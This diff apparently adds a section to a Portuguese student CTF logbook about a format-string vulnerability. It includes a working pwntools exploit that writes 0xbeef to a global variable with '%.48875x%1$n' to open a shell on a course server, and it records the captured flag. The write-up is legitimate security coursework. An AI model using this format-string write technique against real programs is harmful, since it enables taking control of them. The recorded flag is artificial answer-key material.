@@ -269,3 +269,59 @@ with open('badfile', 'wb') as f:
 * a *stack* tem um canário
 * a *stack* não tem permissões de execução
 * as posições do binário em memória não são aleatorizadas
+
+* Tendo em conta que as proteções são as mesmas do que o ficheiro `program` anterior, concluímos que também podemos realizar um ataque do tipo *format string*
+
+* O código do ficheiro `main.c` é semelhante ao anterior, pelo que a vulnerabilidade se encontra na linha abaixo, devido à não sanitização do *input* do utilizador
+
+```c
+printf("There is nothing to see here...");
+fflush(stdout);
+scanf("%32s", &buffer);
+```
+
+* A vulnerabilidade identificada permite escrever diretamente na *string de formatação* e assim, escrever num endereço de memória presente na *stack*
+
+* Observamos também que `key` é uma variável global do programa e que, se esta tiver o valor `0xbeef`, é aberta uma *shell*, que nos permite ler o ficheiro `flag.txt` e, assim, aceder à *flag*
+
+```c
+if(key == 0xbeef) {
+    printf("Backdoor activated\n");
+    fflush(stdout);
+    system("/bin/bash");    
+}
+```
+
+* As funcionalidades que nos permitem obter a flag são o especificador `%n`, que permite escrever num endereço de memória, bem como o *gdb* que nos permite obter esse endereço de memória
+
+```c
+gdb program
+p &key
+```
+![Endereço](/images/logbook7-endereco-desafio2.png)
+
+* Como o número `0xbeef` em hexadecimal corresponde a **48879** em decimal, é necessário imprimir 48879 caracteres antes do especificador `%n`
+
+* Tendo em conta que a *string* de formatação contém o endereço de memória no qual se irá escrever e este ocupa 4 caraceteres, fica a faltar imprimir 48875 (48879 - 4) caracteres para totalizar os 48879
+
+* Então, basta acrescentar o especificador `%.48875x`, obrigando a que seja impresso um valor hexadecimal (do topo da *stack*) constituído por 48875 caracteres
+
+* Finalmente, utilizamos `%1$n` para obrigar o especificador `%n` a escrever no endereço de memória pretendido, que se encontra no topo da *stack*
+
+* Modificamos o `exploit_example.py` para escrever o endereço pretendido em formato string e em *little endian*, seguido de `%.48875x` e de `%1$n`, de maneira a cumprir o pretendido
+
+```python
+#!/usr/bin/python3
+
+from pwn import *
+
+p = remote("ctf-fsi.fe.up.pt", 4005)
+
+p.recvuntil(b"here...")
+p.sendline(b"\x24\xB3\x04\x08%.48875x%1$n")
+p.interactive()
+```	
+
+* Assim, obtivemos a *flag* `flag{8f9a9de482b266abe85cccb83783590d}`
+
+![Endereço](/images/logbook7-flag-desafio2.png)
